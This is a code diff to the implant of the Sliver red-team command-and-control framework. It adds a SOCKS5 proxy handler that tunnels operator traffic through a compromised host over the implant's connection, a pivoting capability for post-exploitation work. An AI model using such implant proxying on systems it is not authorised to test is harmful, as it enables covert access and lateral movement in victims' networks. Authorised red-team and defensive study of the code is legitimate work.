@@ -33,18 +33,15 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/shell"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-
+	"github.com/things-go/go-socks5"
 	"google.golang.org/protobuf/proto"
-)
-
-const (
-	readBufSize = 1024
 )
 
 var (
 	tunnelHandlers = map[uint32]TunnelHandler{
 		sliverpb.MsgShellReq:   shellReqHandler,
 		sliverpb.MsgPortfwdReq: portfwdReqHandler,
+		sliverpb.MsgSocksData:  socksReqHandler,
 
 		sliverpb.MsgTunnelData:  tunnelDataHandler,
 		sliverpb.MsgTunnelClose: tunnelCloseHandler,
@@ -75,9 +72,7 @@ func tunnelCloseHandler(envelope *sliverpb.Envelope, connection *transports.Conn
 		connection.RemoveTunnel(tunnel.ID)
 		tunnel.Reader.Close()
 		tunnel.Writer.Close()
-		if _, ok := tunnelDataCache[tunnel.ID]; ok {
-			delete(tunnelDataCache, tunnel.ID)
-		}
+		delete(tunnelDataCache, tunnel.ID)
 	}
 }
 
@@ -349,4 +344,147 @@ func portfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 		_, err := io.Copy(tWriter, tunnel.Reader)
 		cleanup(err)
 	}()
+}
+
+type socksTunnelPool struct {
+	tunnels    map[uint64]chan []byte
+	readMutex  *sync.Mutex
+	writeMutex *sync.Mutex
+	Sequence   map[uint64]uint64
+}
+
+var socksTunnels = socksTunnelPool{
+	tunnels:    map[uint64]chan []byte{},
+	readMutex:  &sync.Mutex{},
+	writeMutex: &sync.Mutex{},
+	Sequence:   map[uint64]uint64{},
+}
+
+var socksServer *socks5.Server
+
+func socksReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+	socksData := &sliverpb.SocksData{}
+	err := proto.Unmarshal(envelope.Data, socksData)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[socks] Failed to unmarshal protobuf %s", err)
+		// {{end}}
+		return
+	}
+	if socksData.Data == nil {
+		return
+	}
+	// {{if .Config.Debug}}
+	log.Printf("[socks] User to Client to (server to implant) Data Sequence %d, Data Size %d\n", socksData.Sequence, len(socksData.Data))
+	// {{end}}
+
+	if socksData.Username != "" && socksData.Password != "" {
+		cred := socks5.StaticCredentials{
+			socksData.Username: socksData.Password,
+		}
+		auth := socks5.UserPassAuthenticator{Credentials: cred}
+		socksServer = socks5.NewServer(
+			socks5.WithAuthMethods([]socks5.Authenticator{auth}),
+		)
+	} else {
+		socksServer = socks5.NewServer()
+	}
+
+	// {{if .Config.Debug}}
+	log.Printf("[socks] Server: %v", socksServer)
+	// {{end}}
+
+	// init tunnel
+	if _, ok := socksTunnels.tunnels[socksData.TunnelID]; !ok {
+		socksTunnels.tunnels[socksData.TunnelID] = make(chan []byte, 10)
+		socksTunnels.tunnels[socksData.TunnelID] <- socksData.Data
+		err := socksServer.ServeConn(&socks{stream: socksData, conn: connection})
+		if err != nil {
+			return
+		}
+	} else {
+		socksTunnels.tunnels[socksData.TunnelID] <- socksData.Data
+	}
+}
+
+var _ net.Conn = &socks{}
+
+type socks struct {
+	stream *sliverpb.SocksData
+	conn   *transports.Connection
+	// mux      sync.Mutex
+	Sequence uint64
+}
+
+func (s *socks) Read(b []byte) (n int, err error) {
+	socksTunnels.readMutex.Lock()
+	channel := socksTunnels.tunnels[s.stream.TunnelID]
+	socksTunnels.readMutex.Unlock()
+	data := <-channel
+	return copy(b, data), nil
+}
+
+func (s *socks) Write(b []byte) (n int, err error) {
+	socksTunnels.writeMutex.Lock()
+	data, err := proto.Marshal(&sliverpb.SocksData{
+		TunnelID: s.stream.TunnelID,
+		Data:     b,
+		Sequence: s.Sequence,
+	})
+	if !s.conn.IsOpen {
+		return 0, err
+	}
+	// {{if .Config.Debug}}
+	log.Printf("[socks] (implant to Server) to Client to User Data Sequence %d, Data Size %d Data %v\n", s.Sequence, len(b), b)
+	// {{end}}
+	s.conn.Send <- &sliverpb.Envelope{
+		Type: sliverpb.MsgSocksData,
+		Data: data,
+	}
+	socksTunnels.writeMutex.Unlock()
+	s.Sequence++
+	return len(b), err
+}
+
+func (s *socks) Close() error {
+	close(socksTunnels.tunnels[s.stream.TunnelID])
+	delete(socksTunnels.tunnels, s.stream.TunnelID)
+	data, err := proto.Marshal(&sliverpb.SocksData{
+		TunnelID:  s.stream.TunnelID,
+		CloseConn: true,
+	})
+	if !s.conn.IsOpen {
+		return err
+	}
+	s.conn.Send <- &sliverpb.Envelope{
+		Type: sliverpb.MsgSocksData,
+		Data: data,
+	}
+	return err
+}
+
+func (c *socks) LocalAddr() net.Addr {
+	return nil
+}
+
+func (c *socks) RemoteAddr() net.Addr {
+	return &net.IPAddr{
+		IP:   net.IPv4(127, 0, 0, 1),
+		Zone: "",
+	}
+}
+
+// TODO impl
+func (c *socks) SetDeadline(t time.Time) error {
+	return nil
+}
+
+// TODO impl
+func (c *socks) SetReadDeadline(t time.Time) error {
+	return nil
+}
+
+// TODO impl
+func (c *socks) SetWriteDeadline(t time.Time) error {
+	return nil
 }
